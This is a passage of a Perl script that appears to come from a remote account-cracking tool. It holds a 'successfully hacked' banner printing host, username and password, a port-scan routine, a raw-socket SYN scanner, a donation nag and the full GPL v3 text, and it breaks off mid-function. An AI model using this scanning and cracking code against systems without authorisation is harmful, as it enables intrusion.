	print "\n\n SHITOHSHITOHSHITOHSHITOH (Ctrl-C quits) OHSHITOHSHITOHSHITOHSHITOHSHITOHSHIT";	
	goto DISASTER;
}


################################### PRINTSUCCESSHACK ##############################

sub PrintSuccessHack	{
	print "\n ########### AND THE QUARTERBACK IS TOAST! #########\n";
	print "\n ##     Successfully hacked a $scantype account!       ##\n";
	print "\n ##               host: $remote_host              ##\n";
	print "\n ## username: $username     password: $password   ##\n";
	print "\n ###################################################\n\n";
}



################################## PortScan ##################################

sub PortScan	{
	
	my $socket;
	my $internet_addr;
	my $machine_code_addr;
	#my $syn_result;
	my $count;
	
	print "\n Running PortScan()";
	
	if ($synscan eq "ON")	{
		
		print "\n TESTING - See  ../nmap_portscan-socket.pl \n";
		
		$syn_result = SynScan($remote_host, $remote_port);
		if ($syn_result eq "SYN/ACK OPEN" or $syn_result eq "OPEN - SPLIT-HANDSHAKE")	{
			$port_test = "OK";
		}
		else	{
			$port_test = "FAILED";
		}
			# FIX THIS AND PUT IT IN SynScan()
#		if ($syn_result ne "DEAD / TIMEOUT")	{
#			#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $syn_result";
#			$filename = "portscan-conns.txt";
#			WriteReportFile("SPECIAL");
#		}
		print "\n ****************************************";
		print "\n $remote_host $remote_port $syn_result ";
		print "\n ****************************************";
	}
	else	{

		print "\n Doing regular portscan...";

		if ($socket = IO::Socket::INET->new
			(PeerAddr => $remote_host,
			PeerPort => $remote_port,
			Proto => $protocol,
			Timeout => $portscan_timeout))	{
			
			$port_test = "OK";
			#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $port_test";
			#$filename = "portscan-conns.txt";
			#WriteReportFile("SPECIAL");
			
		}
		else	{
			$port_test = "FAILED";
		}
		
	}
	
	print "... \$port_test is $port_test";
	
}
			
	

###################################### NagBitcoin ###############################

sub NagBitcoin	{
	print "\n";
	print " This software would like you to pay the starving artist who wrote it.";
	print "\n Bitcoin and millibitcoin alike to:";
	print "\n";
	print "\n 1PEDKUiUTxGNJ3XTPfXCTAjpzVzX1VZAme";
	print "\n";
}	

##################################### PrintGPL ##################################

sub PrintGPL	{
	
	print "\n";
	print '  GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers\' and authors\' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users\' and
authors\' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users\' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work\'s
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users\' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work\'s
users, your or third parties\' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program\'s source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation\'s users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party\'s predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor\'s "contributor version".

  A contributor\'s "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor\'s essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient\'s use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others\' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy\'s
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS';

	print "\n\n";
	die;
}





###########################################################################
###########################  nmap_portscan-socket.pl ######################
###########################################################################



############################ SYNSCAN  #########################

################################## SYNSCAN ######################################


sub SynScan	{
	
	use Net::Address::IP::Local;
	
	
	my $dest_addr = shift;
	my $dest_port = shift;
	my $verbose = shift;
	my $mode = shift;
	
	my $process;
	
	my $binary_flags;
	#my %incoming_ip_packet;
	my $incoming_ip_packet_source_ip;
	my $incoming_ip_packet_trans_protocol;
	my $incoming_tcp_packet_flags_byte;
	my $incoming_tcp_packet_source_port;
	my %incoming_tcp_packet;
	
	my $num_of_bytes;
	my $mc_destination;
	my $socket;
	
	my @dest_addr_octets;
	my @source_addr_octets;
	my $mc_source_port;
	my $mc_dest_port;
	my $mc_source_addr;
	my $mc_dest_addr;	
	
	my $result;
	my $packet;
	
	# PROBLEM: iT doesn't work unless I specify my own IP address - can't use 0.0.0.0!
	
	my $source_ip_addr = Net::Address::IP::Local->public;
	#my $source_ip_addr = "192.168.1.7";	# (ie, myself) placeholder till I work out how to automatically get my own IP addr
	#my $source_ip_addr = "127.0.0.1";	# (ie, myself) placeholder till I work out how to automatically get my own IP addr
	
	#my $source_ip_addr = "0.0.0.0";	# (ie, myself) placeholder till I work out how to automatically get my own IP addr	
	#my $source_port = 254;	# fucknose how I'm gonna get that sorted # Can't take a source port > 255
	my $source_port = 53467;	# fucknose how I'm gonna get that sorted # Can't take a source port > 255
	
	my $machine_code_addr;
	
	my $connection = "YES!";
	my $synpacket;
	
	my $recv_response;
	my $recv_data;
	
	my $sockfd;
	my $count;
	my $scan_result = "DEAD / TIMEOUT";	 # Defaults to DEAD. Goff!
	
	
	my $ns = "0";
	my $cwr = "0";
	my $ece = "0";
	my $urg = "0";
	my $ack = "0";
	my $psh = "0";
	my $rst = "0";
	my $syn = "1";
	my $fin = "0";
	
	my $subcount = 0;
	
#	$verbose = "ON";
	print "\n";
	print "\n ************************\n * RUNNING SYNSCAN * \n ********************\n";
	print "\n";
	
	$synpacket = PackAss($source_ip_addr,
								$source_port,
								$dest_addr,
								$dest_port,
								$verbose,
								$ns,
								$cwr,
								$ece,
								$urg,
								$ack,
								$psh,
								$rst,
								$syn,
								$fin);
	
	
	# OK, now I have to send the packet! Fun times! :-D
	if ($verbose)	{
		print "\n\n Packet assembly complete.\n\n";
		print " Here's the packet to prove it!" ;
		DisplayData($synpacket);
		print "\n";
		print "\n *****************Decoded: ******************";
		print "\n";
		DecodeTCP ($synpacket, $verbose);
		print "\n";
		print "************************************************";
		print "\n";
	}
	
	
	
	
	@source_addr_octets = split('\.', $source_ip_addr);
	
	@dest_addr_octets = split('\.', $dest_addr);
	
	$mc_source_port = inet_aton($source_port);
	
	$count = 0;
	undef $mc_dest_addr;
	until ($count == scalar(@dest_addr_octets))	{
		if ($verbose)	{
			print "\n$count:$dest_addr_octets[$count]";
		}
		$mc_dest_addr .= inet_aton($dest_addr_octets[$count]);
		$count++;
	}
	
	$count = 0;
	$mc_destination = $dest_port;
	$mc_destination .= $mc_dest_addr;
	
	if ($verbose)	{
		print "\n socketing...\n";
	}
	$sockfd = socket (SOCKET, AF_INET, SOCK_RAW, 6) or die "\n\n *** CAN'T SOCKET! We root? Error:$! Sys:$@ *** \n \$source_port:$source_port \$dest_port:$dest_port\n";
	#$sockfd = socket (SOCKET, AF_INET, SOCK_RAW, 17) or die "\n\n *** CAN'T SOCKET! We root? Error:$! Sys:$@ *** \n \$source_port:$source_port \$dest_port:$dest_port\n";
	
	$|=1;
	my $broadcastAddr;	
	my $custom_remote_host = inet_aton($dest_addr);
	if ($verbose)	{
		print STDOUT "\n remote_host:$dest_addr. \t remote_port:$dest_port";
	}
		
	my $response = $broadcastAddr = sockaddr_in($dest_port, $custom_remote_host); 
	
	$num_of_bytes = length($synpacket);
	$incoming_ip_packet_source_ip = 0;
	$incoming_tcp_packet{SourcePort} = 0;
	$incoming_tcp_packet{SYN} = 0;
	$incoming_tcp_packet{ACK} = 0;
	$count = 0;
	
	$mc_destination = pack('Sna4x8', AF_INET, $dest_port, $dest_addr);
	
	
	
	my $server_port;
	$machine_code_addr = sockaddr_in($server_port, INADDR_ANY); 
	bind (SOCKET, $machine_code_addr)	or die "\n\n Couldn't bind $machine_code_addr. Error:$! \n\n";
	
	

	until ($count >$syn_timeout)	{


		# Put the retransmission thing back here. One retransmission ought to do it.


		
		# With a syn_timeout of 140000, this gives 27 transmission attempts
		# (140,000 / 5002 = 27)
		# How many of these are actually neccesary and how many can a system take before 
		# they are interpreted as an attack?
		
		if ($count % $syn_trans_factor == 0 and $subcount != $syn_trans_attempts)	{
		
		#if ($count % 5002 == 0)	{	

			print STDOUT "\n\t\t Process $$ (RE)SENDING on port $dest_port Subcount:$subcount Count:$count ";
			$subcount++;
			
			# Rebuilding the SYN packet every time we transmit it

			$synpacket = PackAss($source_ip_addr,
								$source_port,
								$dest_addr,
								$dest_port,
								$verbose,
								$ns,
								$cwr,
								$ece,
								$urg,
								$ack,
								$psh,
								$rst,
								$syn,
								$fin);
			
			
			$result = send( SOCKET, $synpacket, 0, $broadcastAddr );
		}


		listen (SOCKET, 1024);
		$recv_response = recv(SOCKET, $recv_data, 1024, MSG_DONTWAIT);

		$count++;
		
		########### THIS BIT IS A MAJOR BOTTLENECK! ##########
		if (length($recv_data) > 20)	{
			#print STDOUT " DECODING IP PKT "; # DELETE ME!
			#%incoming_ip_packet = DecodeIP ($recv_data, $verbose);
			$incoming_ip_packet_trans_protocol = unpack ("(x9C)", $recv_data);
			$incoming_ip_packet_source_ip = unpack ("(x12C)", $recv_data);
			$incoming_ip_packet_source_ip .= ".";
			$incoming_ip_packet_source_ip .= unpack ("(x13C)", $recv_data);
			$incoming_ip_packet_source_ip .= ".";
			$incoming_ip_packet_source_ip .= unpack ("(x14C)", $recv_data);
			$incoming_ip_packet_source_ip .= ".";
			$incoming_ip_packet_source_ip .= unpack ("(x15C)", $recv_data);
		}

		if ($incoming_ip_packet_source_ip == $dest_addr
		and $incoming_ip_packet_trans_protocol == 6)	{
			$incoming_tcp_packet_source_port = unpack ("x20n", $recv_data);

			if ($incoming_tcp_packet_source_port == $dest_port)	{

				$incoming_tcp_packet_flags_byte = ord (substr ($recv_data,33,1));
				
				# Check for syn / ack
				if ($incoming_tcp_packet_flags_byte == 18)	{ 

					$scan_result = "SYN/ACK OPEN";
					print STDOUT "\n\n \t YAAAY SYN/ACK from $incoming_ip_packet_source_ip! ";
	
					#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $syn_result";
					$verbal_report = "$scan_result, Re-trans:$subcount, ";
					$filename = "portscan-conns.txt";
					WriteReportFile("SPECIAL");
					
					last;
				}
=begin comment
				elsif ($incoming_tcp_packet_flags_byte == 02)	{
					$scan_result = "SYN-OPEN (split-HS) ";
					print STDOUT "\n\n \t SPLIT-HANDSHAKE. SYN FROM $incoming_ip_packet_source_ip DETECTED";

					#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $syn_result";
					$verbal_report = "$scan_result, Re-trans:$subcount, ";
					$filename = "portscan-conns.txt";
					WriteReportFile("SPECIAL");

					last;
				}


				elsif ($incoming_tcp_packet_flags_byte == 16)	{
					$scan_result = "ACK-OPEN (split-HS) ";
					print STDOUT "\n\n \t SPLIT-HANDSHAKE. ACK FROM $incoming_ip_packet_source_ip DETECTED";

					#$verbal_report = "\nTime:,$minutesup, $remote_host, $remote_port, $syn_result";
					$verbal_report = "$scan_result, Re-trans:$subcount, ";
					$filename = "portscan-conns.txt";
					WriteReportFile("SPECIAL");

					last;
				}
=end comment
=cut						
				elsif ($incoming_tcp_packet_flags_byte == 20)	{
